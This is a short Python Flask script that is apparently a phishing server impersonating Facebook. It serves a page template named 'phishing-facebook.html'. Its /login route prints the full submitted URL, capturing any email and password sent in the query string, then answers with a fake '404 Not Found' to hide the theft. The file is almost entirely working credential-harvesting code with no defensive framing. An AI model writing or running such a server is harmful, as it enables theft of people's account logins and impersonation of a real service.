from flask import Flask, render_template,request

app = Flask(__name__)

@app.route('/facebook')
def index():
    
    return render_template('phishing-facebook.html')
    
@app.route('/login',methods=['get'])
def login():
    geturl = request.url
    geturl = geturl.replace('%40','@')
    print('[*]',geturl)
    return '404 Not Found'

def main():
    print('hello')
    app.run(host="0.0.0.0",debug=True,port=80)


main()

